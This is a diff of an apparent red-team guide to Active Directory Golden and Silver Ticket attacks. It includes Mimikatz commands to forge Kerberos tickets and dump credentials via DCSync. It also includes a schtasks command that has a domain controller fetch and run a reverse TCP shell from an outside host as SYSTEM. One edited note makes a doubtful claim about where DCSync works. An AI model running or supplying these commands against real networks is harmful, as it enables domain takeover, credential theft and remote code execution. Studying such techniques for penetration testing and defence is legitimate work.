@@ -25,11 +25,12 @@ After that we need to create the ticket.
 
 * **Invoke-Mimikatz**
 
+
 |               **Parameter**              |                                                              **Description**                                                              |
 |:----------------------------------------:|:-----------------------------------------------------------------------------------------------------------------------------------------:|
 | /user:Administrator                      | Username fot which TGT is generated                                                                                                       |
 | /domain:corp.local                       | Domain FQDN                                                                                                                               |
-| S-1-5-21-268341927-4156873456-1784235843 | Domain SID                                                                                                                                |
+| /sid:S-1-5-21-268341927-4156873456-1784235843 | Domain SID                                                                                                                                |
 | /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d | NTLM(RC4) hash of the krbtgt account. Use /aes128 and /aes256 for AES keys.                                                               |
 | /id:500                                  | User RID (default 500)                                                                                                                    |
 | /groups:513                              | Group ID (default 512,513,518,519,520)                                                                                                    |
@@ -92,7 +93,7 @@ In order to execute commands we can do a **dcsync attack** and once obtained the
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\Administrator"'
 ```
-> **Note** Dcsync attack can be done in every domain computer. Command execution on the DC is not needed, but yes Domain Admin privileges.
+> **Note** DCSync attack can be done on any machine even if it is not part of the domain.
 
 ## Mitigation
 
@@ -111,7 +112,7 @@ Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Forma
 
 # Silver Ticket
 
-A Silver Ticket is a valid **TGS** which is encrypted and signed by the NTLM hash of the service account of the service running with that account. Services will allow access only to the services themselves.
+A Silver Ticket is a valid **TGS** which is encrypted and signed by the NTLM hash of the service account like the Machine account hash (DC01$). The TGS will allow access only to the service requested.
 
 This technique is a reasonable persistence because the ticket would be valid for 30 days in computer accounts (default). We are going to target the domain controller machine account. First we need the DC machine account hash.
 
@@ -122,21 +123,31 @@ After that we need to create the ticket.
 
 * **Invoke-Mimikatz**
 
+
+|                 **Parameter**                 |                                      **Description**                                      |
+|:---------------------------------------------:|:-----------------------------------------------------------------------------------------:|
+| /user:Administrator                           | Username fot which TGS is generated                                                       |
+| /domain:corp.local                            | Domain FQDN                                                                               |
+| /sid:S-1-5-21-268341927-4156873456-1784235843 | Domain SID                                                                                |
+| /target:dc.corp.local                         | Target server FQDN                                                                        |
+| /service:CIFS                                 | The SPN name of the service for which TGS will be created                                 |
+| /rc4:6f5b5acaf6744d567ac55e67ff22             | NTLM(RC4) hash of the machine account (DC01$). Use /aes128 and /aes256 for using AES keys |
+| /id:500                                       | User RID (default 500)                                                                    |
+| /groups:513                                   | Group ID (default 512,513,518,519,520)                                                    |
+
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::golden /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /target:dc01.corp.local /service:CIFS /rc4:6f5b5acaf6744d567ac55e67ff22 /user:Administrator /id:500 /groups:512 /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /domain:corp.local /sid:S-1-5-21-268341927-4156873456-1784235843 /target:dc.corp.local /service:CIFS /rc4:6f5b5acaf6744d567ac55e67ff22 /user:Administrator /id:500 /groups:512 /ptt"'
 ```
+> **Note**: `/ptt` injects the ticket in current PowerShell process.
+>
+> `/ticket` saves the ticket to a file for later use.
 
 > **Note**: Similar command can be used for any other service on a machine: `CIFS`, `HOST`, `RPCSS`, `WSMAN`...
 
-Use `klist` to list all kerberos tickets:
+Finally we can list the content of File System (In that case because we forged a Ticket for CIFS service on the DC).
 
 ```
-klist
-```
-And finally we can list the content of File System.
-
-```
-ls \\dc01.corp.local\c$
+ls \\dc.corp.local\c$
 ```
 
 This table shows the available services:
@@ -160,11 +171,11 @@ There are many ways of achieve command executing using Silver Ticket.
 We just need to create a ticket for the `HOST` SPN which will allow us to schedule a task on the target. And then schedule and execute a task.
 
 ```powershell
-schtasks /create /S dc01.corp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10/Invoke-PowerShellTcp.ps1''')'"
+schtasks /create /S dc01.corp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString('''http://10.10.10.10/Invoke-PowerShellTcp.ps1''')'"
 
 schtasks /Run /S dc01.corp.local /TN "STCheck"
 ```
-> **Note**: In that case a Nishang Reverve TCP shell was spawned.
+> **Note**: Create a new schtask with different **TN** name for every try.
 
 ## Execute WMI queries
 
